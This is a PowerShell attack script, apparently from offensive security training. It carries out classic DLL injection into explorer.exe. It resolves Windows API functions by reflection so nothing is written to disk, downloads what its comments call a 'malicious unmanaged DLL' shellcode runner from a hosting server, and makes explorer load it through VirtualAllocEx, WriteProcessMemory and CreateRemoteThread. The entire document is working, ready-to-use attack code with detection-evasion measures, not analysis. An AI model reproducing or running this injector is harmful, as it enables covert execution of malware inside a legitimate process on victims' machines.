# Find address of functions from DLLs to avoid Add-Type (which would write to disk)
function LookupFunc {
    Param ($moduleName, $functionName)
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll')}).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,@($moduleName)), $functionName))
} 
function getDelegateType {
    Param ([Parameter(Position = 0, Mandatory = $True)] [Type[]] $func, [Parameter(Position = 1)] [Type] $delType = [Void])
    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
    return $type.CreateType()
}
# Download malicious unmanaged DLL from server
$hostingServer = "localhost"  # Set this variable to the server in use
$dir = [Environment]::GetFolderPath("MyDocuments")
$dllName = $dir + "\runner.dll"
(New-Object System.Net.WebClient).DownloadFile("http://$hostingServer/runner.dll", $dllName)

# Get the PID of the explorer process and cast it to an integer
$injProc = Get-Process -Name "explorer" | Select-Object -Property Id -First 1
$pid1 = [int]([string]$injProc -replace "[^0-9$]",'')

# Use OpenProcess to get a handle to the explorer process
$hProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll OpenProcess), (getDelegateType @([UInt32], [UInt32], [Int]) ([IntPtr]))).Invoke(0x001F0FFF, 0, $pid1)

# Allocate memory in the explorer process to map the DLL into
$addr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAllocEx), (getDelegateType @([IntPtr], [IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke($hProcess, [IntPtr]::Zero, 0x1000, 0x3000, 0x40)

# Write the DLL name into the target process memory
[Byte[]]$dllNameBytes = [Text.Encoding]::ASCII.GetBytes($dllName)
[IntPtr]$outSize = 0 
$res = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WriteProcessMemory), (getDelegateType @([IntPtr], [IntPtr], [Byte[]], [Int], [IntPtr]) ([UInt32]))).Invoke($hProcess, $addr, $dllNameBytes, $dllNameBytes.Length, $outSize)

# Get address of LoadLibraryA from kernel32.dll
$loadLib = LookupFunc kernel32.dll LoadLibraryA

# Call LoadLibraryA with runner.dll to make explorer load the shellcode runner, executing malicious code
$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateRemoteThread), (getDelegateType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke($hProcess, [IntPtr]::Zero, 0, $loadLib, $addr, 0, [IntPtr]::Zero)

